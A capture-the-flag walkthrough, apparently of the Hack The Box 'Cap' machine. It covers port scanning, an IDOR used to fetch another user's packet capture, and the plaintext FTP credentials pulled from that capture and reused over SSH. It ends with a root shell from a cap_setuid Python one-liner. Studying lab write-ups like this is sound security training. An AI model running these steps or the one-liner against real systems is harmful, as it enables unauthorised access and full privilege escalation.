# [Cap](https://app.hackthebox.com/machines/Cap)

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

### How many TCP ports are open?

Start with a full TCP port scan. `-p-` scans all 65535 ports instead of only the top 1000, `-sV` fingerprints service versions, and `-sC` runs nmap’s default NSE scripts.

```bash
nmap -sVC -p- 10.129.201.210
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Answer:** `3`

---

### After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?

Browse to `http://10.129.201.210/`. The dashboard has a sidebar with a few pages, including one for "Security Snapshot". Clicking it runs the capture and redirects to a page for that scan, which shows packet counts and has a Download button.

The URL has the form `/data/<id>`, where `<id>` is a number assigned to your scan.

**Answer:** `data`

---

### What is the ID of the PCAP file that contains sensative data?

The scan ID is a small sequential integer in the URL, and the application does not check that the capture belongs to the requesting user. This is an IDOR: changing the number in the URL gives access to other user's objects. Captures made earlier by other users are reachable by decrementing the ID.

Change the ID in the URL: `http://10.129.201.210/data/0`

The capture with ID 0 predates the others and shows non-zero packet counts, including TCP traffic. The page has a Download button, so save it as `0.pcap`.

**Answer:** `0`

---

### Which application layer protocol in the pcap file can the sensetive data be found in?

Open `0.pcap` in Wireshark, apply the display filter: `ftp.request.command == "USER" || ftp.request.command == "PASS"`

FTP sends the username and password unencrypted, so both are readable in the capture. The credentials are `nathan` and `Buck3tH4TF0RM3!`.

**Answer:** `ftp`

---

### We've managed to collect nathan's FTP password. On what other service does this password work?

Users often reuse one password across services. The nmap scan showed SSH on port 22, so try the same credentials there.

**Answer:** `ssh`

---

### Submit the flag located in the nathan user's home directory.

```bash
ssh nathan@10.129.201.210
# Password: Buck3tH4TF0RM3!
ls
cat user.txt
```

<img width="331" height="89" alt="SCREEN01" src="https://github.com/user-attachments/assets/943e04a0-a318-493c-8ea5-10ae4f1241f5" />

---

### What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

Linux capabilities split root’s powers into separate privileges that can be assigned to a binary. They are an alternative to setuid and are easy to miss, because `find / -perm -4000` does not list them. Enumerate them with:

```bash
getcap -r / 2>/dev/null
```

**Results:**

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

How to read it:

- `cap_net_raw` on `ping`, `traceroute6` and `mtr-packet` is the normal default. They need raw sockets to work, and the capability gives no route to a shell.
- `gst-ptp-helper` is a package default. `cap_net_admin` is powerful, but there is no practical way to turn it into root here.
- `python3.8` has `cap_setuid`, which allows a process to call `setuid()` to any UID, including 0, without being root. Python is a general-purpose interpreter, so anyone who can run it can run arbitrary code that does exactly that. A capability like this on an interpreter is effectively root.
- The flags `eip` mean effective, inheritable and permitted, so the capability is active as soon as the binary starts.

Use the full path in the exploit. A bare `python3` may resolve to a different file that does not carry the capability.

**Answer:** `/usr/bin/python3.8`

---

### Submit the flag located in root's home directory.

[GTFOBins](https://gtfobins.org/gtfobins/python) documents this pattern for Python under the Capabilities section:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
id
cat /root/root.txt
```

`os.setuid(0)` sets the real, effective and saved UID to 0. `os.execl` then replaces the Python process with `/bin/sh`, which inherits UID 0.

`id` should show `uid=0(root)`. The group will still be nathan’s, because only the UID was changed, and that does not affect reading `/root/root.txt`.

<img width="726" height="165" alt="SCREEN02" src="https://github.com/user-attachments/assets/317027d5-787a-4eb4-8d43-2b14aec15e17" />
